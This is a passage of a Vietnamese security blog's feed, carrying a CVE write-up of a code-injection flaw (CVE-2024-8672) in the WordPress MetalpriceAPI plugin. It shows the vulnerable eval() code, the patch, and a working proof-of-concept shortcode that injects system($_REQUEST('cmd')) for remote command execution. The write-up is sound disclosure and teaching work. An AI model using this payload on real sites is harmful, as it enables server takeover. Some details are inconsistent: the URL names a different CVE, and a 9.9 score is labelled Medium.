class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross Site Scripting&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-8672 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-05-cve-2025-48140/</link>
      <pubDate>Fri, 05 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-05-cve-2025-48140/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-05-cve-2025-48140/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng Improper Control of Generation of Code (&amp;ldquo;Code Injection&amp;rdquo;) trong MetalpriceAPI cho phép thực hiện Code Injection. Vấn đề này ảnh hưởng đến MetalpriceAPI: từ n/a đến phiên bản &lt;strong&gt;1.1.4&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-8672&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-8672&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.1.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/metalpriceapi/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MetalpriceAPI Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;MetalpriceAPI&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v1.1.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($attrs[&amp;#39;operation&amp;#39;])) {&#xA;    $operation = $attrs[&amp;#39;operation&amp;#39;];&#xA;    $operation = str_replace(&amp;#39;(value)&amp;#39;, $price, $operation);&#xA;    eval(&amp;#39;$price = &amp;#39; . $operation . &amp;#39;;&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Giá trị &lt;code&gt;$attrs[&#39;operation&#39;]&lt;/code&gt; từ shortcode được được nối thẳng vào chuỗi PHP rồi đưa vào &lt;code&gt;eval()&lt;/code&gt;, kẻ tấn công có thể chèn mã PHP bất kỳ =&amp;gt; RCE&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v1.1.5):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($attrs[&amp;#39;operation&amp;#39;])) {&#xA;    $price = $this-&amp;gt;safe_math_eval($attrs[&amp;#39;operation&amp;#39;], $price);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thay vì sử dụng &lt;code&gt;eval()&lt;/code&gt; → dùng hàm riêng &lt;code&gt;safe_math_eval&lt;/code&gt; giúp loại bỏ hoàn toàn khả năng thực thi code hệ thống.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function safe_math_eval($expression, $value) {&#xA;    // Remove any whitespace&#xA;    $expression = preg_replace(&amp;#39;/\s&amp;#43;/&amp;#39;, &amp;#39;&amp;#39;, $expression);&#xA;&#xA;    // Only allow basic math operations, numbers, and the value keyword&#xA;    if (!preg_match(&amp;#39;/^[0-9\.\&amp;#43;\-\*\/\(\)value]&amp;#43;$/&amp;#39;, $expression)) {&#xA;        return $value;&#xA;    }&#xA;&#xA;    // Replace (value) with the actual value&#xA;    $expression = str_replace(&amp;#39;(value)&amp;#39;, $value, $expression);&#xA;&#xA;    // Use a safe evaluation method&#xA;    try {&#xA;        // Split the expression into tokens&#xA;        $tokens = preg_split(&amp;#39;/([\&amp;#43;\-\*\/\(\)])/&amp;#39;, $expression, -1, PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY);&#xA;&#xA;        // Convert to Reverse Polish Notation (RPN)&#xA;        $output = array();&#xA;        $operators = array();&#xA;&#xA;        foreach ($tokens as $token) {&#xA;        if (is_numeric($token)) {&#xA;            $output[] = $token;&#xA;        } elseif ($token === &amp;#39;(&amp;#39;) {&#xA;            $operators[] = $token;&#xA;        } elseif ($token === &amp;#39;)&amp;#39;) {&#xA;            while (count($operators) &amp;gt; 0 &amp;amp;&amp;amp; end($operators) !== &amp;#39;(&amp;#39;) {&#xA;            $output[] = array_pop($operators);&#xA;            }&#xA;            if (count($operators) &amp;gt; 0 &amp;amp;&amp;amp; end($operators) === &amp;#39;(&amp;#39;) {&#xA;            array_pop($operators);&#xA;            }&#xA;        } else {&#xA;            $precedence = array(&#xA;            &amp;#39;&amp;#43;&amp;#39; =&amp;gt; 1,&#xA;            &amp;#39;-&amp;#39; =&amp;gt; 1,&#xA;            &amp;#39;*&amp;#39; =&amp;gt; 2,&#xA;            &amp;#39;/&amp;#39; =&amp;gt; 2&#xA;            );&#xA;&#xA;            while (count($operators) &amp;gt; 0 &amp;amp;&amp;amp;&#xA;                    end($operators) !== &amp;#39;(&amp;#39; &amp;amp;&amp;amp;&#xA;                    $precedence[$token] &amp;lt;= $precedence[end($operators)]) {&#xA;            $output[] = array_pop($operators);&#xA;            }&#xA;            $operators[] = $token;&#xA;        }&#xA;        }&#xA;&#xA;        while (count($operators) &amp;gt; 0) {&#xA;        $output[] = array_pop($operators);&#xA;        }&#xA;&#xA;        // Evaluate RPN&#xA;        $stack = array();&#xA;        foreach ($output as $token) {&#xA;        if (is_numeric($token)) {&#xA;            array_push($stack, $token);&#xA;        } else {&#xA;            $b = array_pop($stack);&#xA;            $a = array_pop($stack);&#xA;&#xA;            switch ($token) {&#xA;            case &amp;#39;&amp;#43;&amp;#39;:&#xA;                array_push($stack, $a &amp;#43; $b);&#xA;                break;&#xA;            case &amp;#39;-&amp;#39;:&#xA;                array_push($stack, $a - $b);&#xA;                break;&#xA;            case &amp;#39;*&amp;#39;:&#xA;                array_push($stack, $a * $b);&#xA;                break;&#xA;            case &amp;#39;/&amp;#39;:&#xA;                if ($b == 0) {&#xA;                return $value; // Division by zero&#xA;                }&#xA;                array_push($stack, $a / $b);&#xA;                break;&#xA;            }&#xA;        }&#xA;        }&#xA;&#xA;        $result = array_pop($stack);&#xA;        return is_numeric($result) ? $result : $value;&#xA;    } catch (Exception $e) {&#xA;        return $value;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký shortcode &lt;code&gt;metalpriceapi&lt;/code&gt; với callback là hàm &lt;code&gt;shortcode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_shortcode(&amp;#39;metalpriceapi&amp;#39;, [$this, &amp;#39;shortcode&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong hàm &lt;code&gt;shortcode()&lt;/code&gt;, các tham số đầu vào được lấy từ shortcode thông qua &lt;code&gt;shortcode_atts()&lt;/code&gt;. Sau đó plugin lấy &lt;code&gt;api_key&lt;/code&gt; đã được lưu bằng &lt;code&gt;get_option()&lt;/code&gt;, xây dựng URL và gửi request đến &lt;code&gt;https://api.metalpriceapi.com&lt;/code&gt; bằng &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Nếu đăng ký tài khoản tại &lt;code&gt;metalpriceapi.com&lt;/code&gt; và nhập API key vào phần Settings của plugin&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2025-48140/api.png&#34; title=&#34;Nhập API key&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2025-48140/api.png&#34; data-sub-html=&#34;&lt;h2&gt;API&lt;/h2&gt;&lt;p&gt;Nhập API key&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2025-48140/api.png&#39; alt=&#34;API&#34; height=&#34;288&#34; width=&#34;925&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nhập API key&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;response trả về sẽ có dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;success&amp;#34;:true,&amp;#34;base&amp;#34;:&amp;#34;USD&amp;#34;,&amp;#34;timestamp&amp;#34;:1764633599,&amp;#34;rates&amp;#34;:{&amp;#34;USDXAU&amp;#34;:4230.2580203577,&amp;#34;XAU&amp;#34;:0.0002363922}}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Body của response được &lt;code&gt;json_decode()&lt;/code&gt; thành mảng. Khi điều kiện&#xA;&lt;code&gt;isset($json[&#39;success&#39;]) &amp;amp;&amp;amp; $json[&#39;success&#39;] == true&lt;/code&gt; thỏa mãn và shortcode có cung cấp tham số &lt;code&gt;operation&lt;/code&gt;, plugin thực hiện:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$operation = $attrs[&amp;#39;operation&amp;#39;];&#xA;$operation = str_replace(&amp;#39;(value)&amp;#39;, $price, $operation);&#xA;eval(&amp;#39;$price = &amp;#39; . $operation . &amp;#39;;&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tại đây, giá trị &lt;code&gt;operation&lt;/code&gt; do người dùng kiểm soát được đưa trực tiếp vào &lt;code&gt;eval()&lt;/code&gt;, dẫn đến khả năng thực thi mã PHP tùy ý. Điều này cho phép kẻ tấn công chèn và thực thi lệnh trên máy chủ thông qua tham số &lt;code&gt;operation&lt;/code&gt; của shortcode.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Attacker with Contributor (or higher) role&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Creates or edits a post/content&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;Inserts [metalpriceapi operation=payload]&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;WordPress renders the shortcode&amp;#34;]&#xA;--&amp;gt; E[&amp;#34;Plugin executes shortcode() function&amp;#34;]&#xA;--&amp;gt; F[&amp;#34;operation is concatenated into a PHP expression&amp;#34;]&#xA;--&amp;gt; G[&amp;#34;eval() executes the attacker‑controlled input&amp;#34;]&#xA;--&amp;gt; H[&amp;#34;Remote Code Execution (RCE) on the server&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo post bằng Contributor account&lt;/li&gt;&#xA;&lt;li&gt;Thêm shortcode:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;[metalpriceapi operation=&amp;#39;&amp;#34;abc&amp;#34;;system($_REQUEST(&amp;#34;cmd&amp;#34;));die()&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2025-48140/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2025-48140/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2025-48140/result.png&#39; alt=&#34;Result&#34; height=&#34;409&#34; width=&#34;1221&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2024-8672 trong plugin WordPress MetalpriceAPI (&amp;lt;= 1.1.4) là một lỗ hổng RCE nghiêm trọng do sử dụng trực tiếp hàm &lt;code&gt;eval()&lt;/code&gt; với dữ liệu do người dùng kiểm soát từ tham số &lt;code&gt;operation&lt;/code&gt; của shortcode. Chỉ cần quyền Contributor, kẻ tấn công có thể chèn và thực thi mã PHP tùy ý trên máy chủ, dẫn đến nguy cơ chiếm quyền hệ thống, làm rò rỉ dữ liệu hoặc cài mã độc. Phiên bản 1.1.5 đã khắc phục bằng cách loại bỏ &lt;code&gt;eval()&lt;/code&gt; và thay thế bằng hàm xử lý biểu thức an toàn hơn.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không bao giờ sử dụng &lt;code&gt;eval()&lt;/code&gt; với dữ liệu đầu vào từ người dùng, dù là gián tiếp.&lt;/li&gt;&#xA;&lt;li&gt;Shortcode trong WordPress nếu không kiểm soát chặt chẽ có thể trở thành điểm vào của RCE.&lt;/li&gt;&#xA;&lt;li&gt;Cần luôn kiểm tra, lọc và giới hạn ký tự hợp lệ của tham số đầu vào.&lt;/li&gt;&#xA;&lt;li&gt;Nên sử dụng bộ phân tích cú pháp (parser) hoặc hàm xử lý riêng thay vì thực thi trực tiếp biểu thức động.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  